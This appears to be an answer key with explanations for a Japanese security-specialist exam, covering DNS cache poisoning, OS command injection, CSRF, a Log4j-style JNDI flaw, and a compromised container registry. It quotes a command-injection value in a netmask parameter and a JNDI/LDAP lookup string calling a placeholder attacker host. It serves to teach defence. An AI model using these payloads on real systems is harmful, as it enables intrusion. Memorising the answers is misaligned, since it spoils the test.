## 問1 IoT製品の開発（J社 / ロボット掃除機のファームウェアとWebアプリ）

| 設問 | 解答 |
|---|---|
| 設問1(1) | a：DNSキャッシュポイズニング |
| 設問1(2) | b：エ |
| 設問1(3) | 権威DNSサーバからの応答よりも早く到達する。 |
| 設問1(4) | サーバ証明書を検証し，通信相手がWサーバであることを確認する実装 |
| 設問1(5) | c：コードサイニング |
| 設問2 | d：シェルが実行するコマンドをパラメータで不正に指定できて |
| 設問3(1) | 攻撃リクエストをPOSTメソッドで送信させるスクリプトを含むページを表示させる仕組み |
| 設問3(2) | e：推測困難である |
| 設問4 | 脆弱性A：ア　脆弱性B：オ |

### 解説

#### 設問1(1)(2)　［知識］
> 本文：「DNSキャッシュサーバが権威DNSサーバにWサーバの名前解決要求を行ったときに，攻撃者が**偽装したDNS応答**を送信する」「DNSキャッシュサーバが攻撃者による応答を正当なDNS応答として処理してしまい，**偽の情報が保存**される」

**知識**：キャッシュサーバに偽の応答を覚え込ませる攻撃が**DNSキャッシュポイズニング**。通常のDNS問合せは**UDP**で，コネクションを張らないので，送信元を偽った応答パケットを送り込みやすい。

**答え**：a：DNSキャッシュポイズニング　b：エ（UDP）

#### 設問1(3)　［知識］
> 本文：下線①「（攻撃者が送信したDNS応答が）**幾つかの条件**を満たした場合に成功する」

**知識**：キャッシュサーバが偽の応答を受け入れる条件は，問合せと**IDやポート番号が一致**すること，そして**本物の権威DNSサーバの応答より先に届く**こと（後から届いた本物は捨てられる）。

**答え**：権威DNSサーバからの応答よりも早く到達する。

#### 設問1(4)　［読解］＋［知識］
> 本文：下線②「製品Rは，Wサーバとの間の通信において**HTTPSを適切に実装**しているので，この攻撃の影響は受けない」

**知識**：名前解決をだまされても，HTTPSで**サーバ証明書を検証**すれば，接続先が本物のWサーバかどうか分かる。攻撃者はWサーバの正しい証明書（秘密鍵）を持てないので，偽サーバとの接続は失敗する。暗号化しているだけでは防げない（採点講評でもそこが指摘されている）。

**答え**：サーバ証明書を検証し，通信相手がWサーバであることを確認する実装

#### 設問1(5)　［知識］
> 本文：G主任「攻撃者がWサーバに侵入するなどの方法で**ファームウェアを直接置き換える**場合」「［ c ］証明書がJ社のものであることを検証…ダウンロードしたファームウェアの**真正性を検証**」

**知識**：プログラムに開発元が署名し，改ざんされていないこと・発行元が正しいことを確かめられるようにする仕組みが**コードサイニング**（コード署名）。Wサーバ自体が乗っ取られても，J社の署名鍵がなければ正しい署名を作れない。

**答え**：c：コードサイニング

#### 設問2　［読解］
> 本文：「setvalueが図3中のパラメータを含むコマンド文字列を**シェルに渡す**」，図4「ifconfig eth1 "192.168.1.101" netmask "255.255.255.0"」
> 本文：図5「`netmask=255.255.255.0";ping -c 1 192.168.1.10;"`」

**考え方**：パラメータをそのままコマンド文字列に埋め込んでいるので，`"` で引用を閉じ，`;` で区切れば別のコマンドを続けられる。シェルが実行するコマンドを利用者がパラメータで指定できてしまう（OSコマンドインジェクション）。

**答え**：d：シェルが実行するコマンドをパラメータで不正に指定できて

#### 設問3(1)　［読解］＋［知識］
> 本文：図1「IPアドレス設定機能：**POSTメソッドによる入力だけ**を受け付ける」，脆弱性B「ログイン済みの利用者が攻撃者によって設置された**罠サイトにアクセス**し，利用者が意図せずに悪意のあるリクエストを…送信させられた」

**知識**：CSRFでPOSTのリクエストを送らせるには，罠ページにフォームを置き，**ページを開いた瞬間にスクリプトで自動送信**させる。利用者のブラウザから送られるので，ログイン中のセッション（cookie）が付く。

**答え**：攻撃リクエストをPOSTメソッドで送信させるスクリプトを含むページを表示させる仕組み

#### 設問3(2)　［知識］
> 本文：「リクエストのパラメータに，セッションにひも付けられ，かつ，［ e ］という特徴をもつトークンを付与し，WebアプリRはそのトークンを検証」

**知識**：CSRF対策のトークンは，攻撃者が罠ページに書き込めないよう，**第三者が推測できない**値でなければならない。

**答え**：e：推測困難である

#### 設問4　［知識］
> 本文：脆弱性A「**任意のコマンドを実行**してしまう」，脆弱性B「利用者が意図せずに悪意のあるリクエストを…**送信させられた**」

**答え**：脆弱性A：ア（CWE-78 OSコマンドインジェクション）　脆弱性B：オ（CWE-352 クロスサイトリクエストフォージェリ）

## 問2 脆弱性に起因するセキュリティインシデントへの対応（U社 / ライブラリXの脆弱性）

| 設問 | 解答 |
|---|---|
| 設問1 | a：a3.b3.c3.d3 |
| 設問2(1) | runプロセスの親プロセスがTソフトのプロセスであるから |
| 設問2(2) | b：13:04:32　c：13:05:50　d：a8.b8.c8.d8　e：LDAP　f：JExp |
| 設問3(1) | ログ出力処理する文字列中に攻撃文字列が含まれれば悪用可能だから |
| 設問3(2) | 会員サーバからインターネット宛てのLDAP通信が許可されていないから |
| 設問4 | g：予約サーバ　h：SNS投稿用のサーバのURL　i：全て |

### 解説

#### 設問1　［読解］
> 本文：表3「200　100　13:06:30　**run**」，表4「予約サーバ　**a3.b3.c3.d3**　HTTP　**200**」

**考え方**：runプロセスのプロセスIDは200。表4でプロセスID 200 の通信先は a3.b3.c3.d3。

**答え**：a：a3.b3.c3.d3

#### 設問2(1)　［読解］
> 本文：表3「プロセスID 200（run）　**親プロセスID 100**」「100　java **BSoftMain**」，「普段予約サーバでは，BSoftMainとSBMainという**Tソフトのプロセス**が稼働」

**考え方**：runを起動したのは，Tソフトのプロセス（BSoftMain，ID 100）。だからTソフトを調べれば原因が分かる（採点講評でも，起動順ではなく親子関係を見ることが大事とある）。

**答え**：runプロセスの親プロセスがTソフトのプロセスであるから

#### 設問2(2)　［読解］
> 本文：表5「**13:04:32**　a7.b7.c7.d7　GET /index.html　`${jndi:ldap://a8.b8.c8.d8/JExp}`」
> 本文：表6「**13:05:50**　予約サーバ　**a8.b8.c8.d8**　**LDAP**　許可」
> 本文：図2「ライブラリXはIPアドレスがa4.b4.c4.d4のサーバに対し，LDAPで“Exploit”というクエリを送る」

**考え方**：図2の例に当てはめると，攻撃文字列の「a8.b8.c8.d8」がLDAPサーバ，「JExp」がクエリ。攻撃の通信が13:04:32，予約サーバがLDAPで問い合わせたのが13:05:50。

**答え**：b：13:04:32　c：13:05:50　d：a8.b8.c8.d8　e：LDAP　f：JExp

#### 設問3(1)　［読解］
> 本文：図2「ライブラリXを使用した**ログ出力処理の対象となる文字列中**に特定の攻撃文字列が含まれる場合」，表5 攻撃文字列は**ユーザエージェント**に入っていた

**考え方**：ログに書かれる文字列（ユーザエージェントなど）に攻撃文字列が入っていればよいので，ログインしていなくても，最初のアクセスのログ出力で発動する（採点講評でも正答率が低かった）。

**答え**：ログ出力処理する文字列中に攻撃文字列が含まれれば悪用可能だから

#### 設問3(2)　［読解］
> 本文：表2 項番1「インターネット→予約サーバ，会員サーバ　HTTPS」，項番2「**予約サーバ**→インターネット　**全て**　許可」，注記3「項番6〜11にはDMZ内のサーバとインターネットとの間…の通信に関するルールはない」，項番12「全て　拒否」

**考え方**：攻撃が成功するには，サーバから攻撃者のLDAPサーバへ問い合わせる必要がある。予約サーバは外への通信が全部許可されているが，会員サーバから外への通信を許可するルールはないので，LDAPの問合せがFWで止まった。

**答え**：会員サーバからインターネット宛てのLDAP通信が許可されていないから

#### 設問4　［読解］
> 本文：表1 予約サーバ「工場見学の空き状況は…**クラウドサービス上の複数のSNS投稿用のサーバ**に対して**HTTPS**で定期的に投稿」
> 本文：再発防止策「予約サーバを起点とするインターネットへのHTTPS通信は，**プロキシサーバを中継**」「表2の項番2を削除」
> 本文：表1 プロキシサーバ「許可リスト…拒否リストに“**全て**”を指定すると，許可リストに指定したURL以外のURLへの通信が拒否」

**考え方**：予約サーバが外に出る必要があるのは，SNS投稿用のサーバへのHTTPSだけ。予約サーバのIPアドレスに対して，許可リストにSNS投稿用のサーバのURL，拒否リストに「全て」を入れれば，それ以外への通信は止まる。

**答え**：g：予約サーバ　h：SNS投稿用のサーバのURL　i：全て

## 問3 オンラインゲーム事業者でのセキュリティインシデント対応（M社 / OSSへの悪意あるコード混入）

| 設問 | 解答 |
|---|---|
| 設問1(1) | a：376 |
| 設問1(2) | progというファイルをダウンロードし，実行する命令 |
| 設問1(3) | b：一時ディレクトリ内のログ |
| 設問1(4) | ゼロデイ攻撃 |
| 設問2(1) | レジストリサーバに固有のレスポンスヘッダ |
| 設問2(2) | 上書きされたイメージを削除する。 |
| 設問3(1) | c：a3.b3.c3.d3 |
| 設問3(2) | d：エ |
| 設問3(3) | 別のIPアドレスを攻撃者が用いる場合 |
| 設問3(4) | e：オ |

### 解説

#### 設問1(1)　［読解］
> 本文：「3月6日に開発部から**タグ367**を伝達され」，表2「タグ**376**　3月6日10時14分に起動」，表3 項番1「ゲームサーバ1　GET /v2/gameapp/manifests/**376**」

**考え方**：367のはずが，ゲームサーバ1では数字を入れ替えた376を取得していた。ゲームサーバ2は正しく367（表3 項番2）。

**答え**：a：376

#### 設問1(2)　［読解］
> 本文：図3「タグ［ a ］のゲームイメージに，**progという名称のファイルは含まれていない**」「コードZは…攻撃者が用意した外部のサーバに接続して，**指示された任意の命令を実行**する」
> 本文：表1 ゲームサーバ「一時ディレクトリ内のファイルの作成，読込み，書込み及び**実行**」「ネットワーク接続の接続先には**制限がない**」

**考え方**：イメージにないprogが動いているので，外から持ち込まれた。コードZが攻撃者のサーバから「progをダウンロードして実行せよ」という命令を受け，一時ディレクトリに保存して実行したと考えられる。

**答え**：progというファイルをダウンロードし，実行する命令

#### 設問1(3)　［読解］
> 本文：表1 ゲームサーバ「ゲームアプリは**ログを一時ディレクトリ**に出力する。一時ディレクトリはコンテナ起動時に作成され，**コンテナ終了時に消去**される」

**考え方**：コンテナを終了すると一時ディレクトリが消え，そこにあるログ（progの痕跡も含む）が失われる。調査のため一時停止にとどめる。

**答え**：b：一時ディレクトリ内のログ

#### 設問1(4)　［知識］
> 本文：下線②「**対策情報が公開される前**の脆弱性を悪用した攻撃」

**知識**：修正プログラムなどの対策が出る前の脆弱性（ゼロデイ脆弱性）を突く攻撃を**ゼロデイ攻撃**という。

**答え**：ゼロデイ攻撃

#### 設問2(1)　［読解］＋［知識］
> 本文：表3 項番4「ゲームサーバ1　GET **/index.html**　**404 Not Found**」→ 項番5「GET /v2/_catalog」
> 本文：下線③「攻撃者は当社のネットワーク構成について詳細を知らずに項番4のアクセスをし，**そのレスポンスの内容から**…コンテナイメージが登録されているサーバだと判断した」

**知識**：Webサーバは，404の応答でもHTTPレスポンスヘッダに製品やAPIの種類を示す情報を入れる。コンテナレジストリのAPIは，そのレジストリに固有のヘッダ（APIバージョンなど）を返す。

**考え方**：/index.html は存在しないので本文は役に立たないが，レスポンスヘッダからレジストリサーバだと分かり，次にレジストリAPI（/v2/_catalog）を呼んでいる。

**答え**：レジストリサーバに固有のレスポンスヘッダ

#### 設問2(2)　［読解］
> 本文：K主任「レジストリサーバ上のタグ**341から379**までのゲームイメージが**上書きされた可能性**があります。したがって，ゲームサーバ3及びゲームサーバ4に対して更新を行うべきではありません」
> 本文：表3 項番8〜46「PUT /v2/gameapp/manifests/379 … 341　201 Created」

**考え方**：上書きされたイメージが残っていると，誰かがそれを取得して不正なコンテナを動かしてしまう。被害の拡大を防ぐため，上書きされたイメージを削除する。

**答え**：上書きされたイメージを削除する。

#### 設問3(1)(2)　［読解］＋［知識］
> 本文：「ゲームサーバ1は**インターネット上のIPアドレスa3.b3.c3.d3**及びレジストリサーバに対してだけ接続していた」
> 本文：「［ d ］はマルウェア感染によって**攻撃者の制御下**となったコンピュータで構成されます」

**知識**：攻撃者がC&Cサーバから命令を出して操る，感染したコンピュータの集まりを**ボットネット**という。

**考え方**：外部で通信していた相手は a3.b3.c3.d3 だけなので，これが攻撃の指示を出すサーバ。

**答え**：c：a3.b3.c3.d3　d：エ（ボットネット）

#### 設問3(3)　［読解］
> 本文：Hさん「IPアドレス［ c ］への接続を業務用FWで拒否する」，K主任「攻撃者が**同種の方法**で攻撃の指示をしたときに⑤対策として有効でない場合」

**考え方**：特定のIPアドレスを止めても，攻撃者はC&Cサーバのアドレスを簡単に変えられる。別のIPアドレスを使われたら防げない（ゲームサーバから外への通信自体を必要なものに絞る対策が要る）。

**答え**：別のIPアドレスを攻撃者が用いる場合

#### 設問3(4)　［読解］
> 本文：表1 ソースコードサーバ「ゲームアプリのコンテナイメージ（ゲームイメージ）を新たに生成し，**レジストリサーバに登録**する」
> 本文：表3 項番3「**ソースコードサーバ**　PUT /v2/gameapp/manifests/379」，Hさん「ゲームイメージの**新規登録及び上書き登録**の呼出しについて，呼出し元IPアドレスを［ e ］のIPアドレスからだけに制限」

**考え方**：正当にイメージを登録するのはソースコードサーバだけ。ゲームサーバ（項番8〜46の攻撃元）からの登録はできなくなる（採点講評でも，ソースコードサーバの登録を見落とした解答があったとある）。

**答え**：e：オ（ソースコードサーバ）
